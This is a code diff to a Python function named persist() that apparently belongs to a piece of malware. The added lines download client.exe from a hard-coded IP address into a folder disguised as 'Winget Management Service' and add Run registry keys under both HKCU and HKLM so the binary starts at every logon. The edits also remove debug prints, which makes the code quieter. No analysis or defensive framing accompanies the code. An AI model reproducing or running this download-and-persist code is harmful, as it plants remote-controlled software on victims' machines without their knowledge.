@@ -661,18 +661,17 @@ def persist():
             os.mkdir('Winget Management Service')
             os.chdir('Winget Management Service')
             response = requests.get('http://50.116.8.102/client.exe')
-            open('client_rewritten.py', 'wb').write(response.content)
-            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "py {os.environ["APPDATA"]}/Winget Management Service/client.exe"'
-            print(command)
+            open('client.exe', 'wb').write(response.content)
+            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}/Winget Management Service/client.exe"'
             os.system(command)
+            os.system(f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}/Winget Management Service/client.exe"')
 
         except FileExistsError:
             os.chdir('Winget Management Service')
-            persistent = os.path.exists('client_rewritten.py')
+            persistent = os.path.exists('client.exe')
             if not persistent:
                 response = requests.get('http://50.116.8.102/client.exe')
-                open('client_rewritten.py', 'wb').write(response.content)
-                print('File downloaded')
+                open('client.exe', 'wb').write(response.content)
                 return True
         os.chdir(running_dir)
 
